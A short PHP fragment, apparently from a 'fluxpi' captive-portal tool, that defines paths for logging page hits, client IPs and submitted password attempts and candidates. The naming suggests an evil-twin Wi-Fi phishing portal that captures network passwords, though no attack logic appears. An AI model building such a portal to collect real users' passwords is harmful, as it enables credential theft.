<?php
	...
	// Update hit attempts
	$page_hits_log_path = ("/tmp/fluxpi/captive_portal/hit.txt");
	...
	$attempt_log_path = "/tmp/fluxpi/captive_portal/pwdattempt.txt";
	$candidate_path = "/tmp/fluxpi/captive_portal/candidate.txt";
	...
	$candidate_result_path = "/tmp/fluxpi/captive_portal/candidate_result.txt";

	// Define variables
	$client_ip_path = "/tmp/fluxpi/captive_portal/ip_hits";
